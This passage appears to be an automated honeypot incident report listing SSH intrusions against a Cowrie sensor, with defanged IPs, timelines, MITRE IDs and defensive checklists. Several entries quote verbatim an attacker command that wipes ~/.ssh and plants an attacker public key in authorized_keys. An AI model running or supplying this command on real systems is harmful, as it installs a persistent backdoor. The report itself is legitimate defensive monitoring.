| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:17:58` | `cowrie.session.connect` |
| `2026-09-01 19:17:58` | `cowrie.client.version` |
| `2026-09-01 19:17:58` | `cowrie.client.kex` |
| `2026-09-01 19:17:59` | `cowrie.login.success` |
| `2026-09-01 19:17:59` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:18:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:18:00` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ec26d347f58

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-09-01 19:18 |
| **Last Seen** | 2026-09-01 19:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:18:26` | `cowrie.session.connect` |
| `2026-09-01 19:18:26` | `cowrie.client.version` |
| `2026-09-01 19:18:26` | `cowrie.client.kex` |
| `2026-09-01 19:18:27` | `cowrie.login.success` |
| `2026-09-01 19:18:28` | `cowrie.session.params` |
| `2026-09-01 19:18:28` | `cowrie.command.input` |
| `2026-09-01 19:18:28` | `cowrie.command.failed` |
| `2026-09-01 19:18:29` | `cowrie.log.closed` |
| `2026-09-01 19:18:29` | `cowrie.session.params` |
| `2026-09-01 19:18:29` | `cowrie.command.input` |
| `2026-09-01 19:18:30` | `cowrie.session.file_download` |
| `2026-09-01 19:18:30` | `cowrie.log.closed` |
| `2026-09-01 19:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da93d8c6f7c

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-09-01 19:18 |
| **Last Seen** | 2026-09-01 19:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:18:30` | `cowrie.session.connect` |
| `2026-09-01 19:18:30` | `cowrie.client.version` |
| `2026-09-01 19:18:30` | `cowrie.client.kex` |
| `2026-09-01 19:18:31` | `cowrie.login.success` |
| `2026-09-01 19:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7ef7037b1e

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-09-01 19:18 |
| **Last Seen** | 2026-09-01 19:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:18:31` | `cowrie.session.connect` |
| `2026-09-01 19:18:31` | `cowrie.client.version` |
| `2026-09-01 19:18:32` | `cowrie.client.kex` |
| `2026-09-01 19:18:33` | `cowrie.login.success` |
| `2026-09-01 19:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6489715c9c9b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-01 19:18 |
| **Last Seen** | 2026-09-01 19:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:18:58` | `cowrie.session.connect` |
| `2026-09-01 19:18:58` | `cowrie.client.version` |
| `2026-09-01 19:18:58` | `cowrie.client.kex` |
| `2026-09-01 19:18:58` | `cowrie.login.success` |
| `2026-09-01 19:18:58` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:18:58` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cfdce3d2025

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:20 |
| **Last Seen** | 2026-09-01 19:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:20:03` | `cowrie.session.connect` |
| `2026-09-01 19:20:03` | `cowrie.client.version` |
| `2026-09-01 19:20:03` | `cowrie.client.kex` |
| `2026-09-01 19:20:04` | `cowrie.login.success` |
| `2026-09-01 19:20:04` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:20:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:20:04` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3681e6909687

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:27 |
| **Last Seen** | 2026-09-01 19:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:27:30` | `cowrie.session.connect` |
| `2026-09-01 19:27:30` | `cowrie.client.version` |
| `2026-09-01 19:27:30` | `cowrie.client.kex` |
| `2026-09-01 19:27:31` | `cowrie.login.success` |
| `2026-09-01 19:27:31` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:27:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:27:32` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a012c4c10d15

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:31 |
| **Last Seen** | 2026-09-01 19:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:31:07` | `cowrie.session.connect` |
| `2026-09-01 19:31:07` | `cowrie.client.version` |
| `2026-09-01 19:31:07` | `cowrie.client.kex` |
| `2026-09-01 19:31:08` | `cowrie.login.success` |
| `2026-09-01 19:31:08` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:31:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:31:08` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b60100c7231

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:37 |
| **Last Seen** | 2026-09-01 19:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:37:23` | `cowrie.session.connect` |
| `2026-09-01 19:37:23` | `cowrie.client.version` |
| `2026-09-01 19:37:24` | `cowrie.client.kex` |
| `2026-09-01 19:37:25` | `cowrie.login.success` |
| `2026-09-01 19:37:25` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:37:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:37:25` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea179fabd5cd

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:42 |
| **Last Seen** | 2026-09-01 19:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:42:13` | `cowrie.session.connect` |
| `2026-09-01 19:42:13` | `cowrie.client.version` |
| `2026-09-01 19:42:13` | `cowrie.client.kex` |
| `2026-09-01 19:42:14` | `cowrie.login.success` |
| `2026-09-01 19:42:14` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:42:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:42:14` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a42afd371b6f

| Field | Detail |
|---|---|
| **Source IP** | `104.248.160[.]169` |
| **First Seen** | 2026-09-01 19:44 |
| **Last Seen** | 2026-09-01 19:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:44:32` | `cowrie.session.connect` |
| `2026-09-01 19:44:32` | `cowrie.client.version` |
| `2026-09-01 19:44:32` | `cowrie.client.kex` |
| `2026-09-01 19:44:33` | `cowrie.login.success` |
| `2026-09-01 19:44:33` | `cowrie.session.params` |
| `2026-09-01 19:44:33` | `cowrie.command.input` |
| `2026-09-01 19:44:33` | `cowrie.command.failed` |
| `2026-09-01 19:44:34` | `cowrie.log.closed` |
| `2026-09-01 19:44:34` | `cowrie.session.params` |
| `2026-09-01 19:44:34` | `cowrie.command.input` |
| `2026-09-01 19:44:34` | `cowrie.session.file_download` |
| `2026-09-01 19:44:34` | `cowrie.log.closed` |
| `2026-09-01 19:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.160[.]169` to AbuseIPDB if not already reported
- [ ] Block `104.248.160[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a70afeaee6f

| Field | Detail |
|---|---|
| **Source IP** | `104.248.160[.]169` |
| **First Seen** | 2026-09-01 19:44 |
| **Last Seen** | 2026-09-01 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:44:34` | `cowrie.session.connect` |
| `2026-09-01 19:44:34` | `cowrie.client.version` |
| `2026-09-01 19:44:35` | `cowrie.client.kex` |
| `2026-09-01 19:44:35` | `cowrie.login.success` |
| `2026-09-01 19:44:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.160[.]169` to AbuseIPDB if not already reported
- [ ] Block `104.248.160[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8183b70fc59

| Field | Detail |
|---|---|
| **Source IP** | `104.248.160[.]169` |
| **First Seen** | 2026-09-01 19:44 |
| **Last Seen** | 2026-09-01 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:44:35` | `cowrie.session.connect` |
| `2026-09-01 19:44:35` | `cowrie.client.version` |
| `2026-09-01 19:44:35` | `cowrie.client.kex` |
| `2026-09-01 19:44:35` | `cowrie.login.success` |
| `2026-09-01 19:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.160[.]169` to AbuseIPDB if not already reported
- [ ] Block `104.248.160[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba395368cf9e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:47 |
| **Last Seen** | 2026-09-01 19:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:47:11` | `cowrie.session.connect` |
| `2026-09-01 19:47:11` | `cowrie.client.version` |
| `2026-09-01 19:47:11` | `cowrie.client.kex` |
| `2026-09-01 19:47:12` | `cowrie.login.success` |
| `2026-09-01 19:47:12` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:47:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:47:13` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-091f77524c51

| Field | Detail |
|---|---|
| **Source IP** | `37.59.111[.]144` |
| **First Seen** | 2026-09-01 19:48 |
| **Last Seen** | 2026-09-01 19:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:48:03` | `cowrie.session.connect` |
| `2026-09-01 19:48:03` | `cowrie.client.version` |
| `2026-09-01 19:48:03` | `cowrie.client.kex` |
| `2026-09-01 19:48:03` | `cowrie.login.success` |
| `2026-09-01 19:48:04` | `cowrie.session.params` |
| `2026-09-01 19:48:04` | `cowrie.command.input` |
| `2026-09-01 19:48:04` | `cowrie.command.failed` |
| `2026-09-01 19:48:04` | `cowrie.log.closed` |
| `2026-09-01 19:48:05` | `cowrie.session.params` |
| `2026-09-01 19:48:05` | `cowrie.command.input` |
| `2026-09-01 19:48:05` | `cowrie.session.file_download` |
| `2026-09-01 19:48:05` | `cowrie.log.closed` |
| `2026-09-01 19:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.59.111[.]144` to AbuseIPDB if not already reported
- [ ] Block `37.59.111[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfb8d2f0f6a

| Field | Detail |
|---|---|
| **Source IP** | `37.59.111[.]144` |
| **First Seen** | 2026-09-01 19:48 |
| **Last Seen** | 2026-09-01 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:48:05` | `cowrie.session.connect` |
| `2026-09-01 19:48:05` | `cowrie.client.version` |
| `2026-09-01 19:48:05` | `cowrie.client.kex` |
| `2026-09-01 19:48:06` | `cowrie.login.success` |
| `2026-09-01 19:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.59.111[.]144` to AbuseIPDB if not already reported
- [ ] Block `37.59.111[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747f0aa8f447

| Field | Detail |
|---|---|
| **Source IP** | `37.59.111[.]144` |
| **First Seen** | 2026-09-01 19:48 |
| **Last Seen** | 2026-09-01 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:48:06` | `cowrie.session.connect` |
| `2026-09-01 19:48:06` | `cowrie.client.version` |
| `2026-09-01 19:48:06` | `cowrie.client.kex` |
| `2026-09-01 19:48:06` | `cowrie.login.success` |
| `2026-09-01 19:48:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.59.111[.]144` to AbuseIPDB if not already reported
- [ ] Block `37.59.111[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-478d0b7d47e2

| Field | Detail |
|---|---|
| **Source IP** | `88.249.195[.]23` |
| **First Seen** | 2026-09-01 19:48 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:48:57` | `cowrie.session.connect` |
| `2026-09-01 19:48:57` | `cowrie.client.version` |
| `2026-09-01 19:48:58` | `cowrie.client.kex` |
| `2026-09-01 19:48:58` | `cowrie.login.success` |
| `2026-09-01 19:48:59` | `cowrie.session.params` |
| `2026-09-01 19:48:59` | `cowrie.command.input` |
| `2026-09-01 19:48:59` | `cowrie.command.failed` |
| `2026-09-01 19:48:59` | `cowrie.log.closed` |
| `2026-09-01 19:49:00` | `cowrie.session.params` |
| `2026-09-01 19:49:00` | `cowrie.command.input` |
| `2026-09-01 19:49:00` | `cowrie.session.file_download` |
| `2026-09-01 19:49:00` | `cowrie.log.closed` |
| `2026-09-01 19:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.249.195[.]23` to AbuseIPDB if not already reported
- [ ] Block `88.249.195[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee4fe8749798

| Field | Detail |
|---|---|
| **Source IP** | `88.249.195[.]23` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:00` | `cowrie.session.connect` |
| `2026-09-01 19:49:00` | `cowrie.client.version` |
| `2026-09-01 19:49:00` | `cowrie.client.kex` |
| `2026-09-01 19:49:01` | `cowrie.login.success` |
| `2026-09-01 19:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.249.195[.]23` to AbuseIPDB if not already reported
- [ ] Block `88.249.195[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d3a57fcaecf

| Field | Detail |
|---|---|
| **Source IP** | `88.249.195[.]23` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:01` | `cowrie.session.connect` |
| `2026-09-01 19:49:01` | `cowrie.client.version` |
| `2026-09-01 19:49:01` | `cowrie.client.kex` |
| `2026-09-01 19:49:02` | `cowrie.login.success` |
| `2026-09-01 19:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.249.195[.]23` to AbuseIPDB if not already reported
- [ ] Block `88.249.195[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a668db035a03

| Field | Detail |
|---|---|
| **Source IP** | `41.90.100[.]147` |
| **First Seen** | 2026-09-01 19:49 |
| **Last Seen** | 2026-09-01 19:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:49:06` | `cowrie.session.connect` |
| `2026-09-01 19:49:06` | `cowrie.client.version` |
| `2026-09-01 19:49:07` | `cowrie.client.kex` |
| `2026-09-01 19:49:08` | `cowrie.login.success` |
| `2026-09-01 19:49:09` | `cowrie.session.params` |
| `2026-09-01 19:49:09` | `cowrie.command.input` |
| `2026-09-01 19:49:09` | `cowrie.command.failed` |
| `2026-09-01 19:49:09` | `cowrie.log.closed` |
| `2026-09-01 19:49:10` | `cowrie.session.params` |
| `2026-09-01 19:49:10` | `cowrie.command.input` |
| `2026-09-01 19:49:11` | `cowrie.session.file_download` |
| `2026-09-01 19:49:11` | `cowrie.log.closed` |
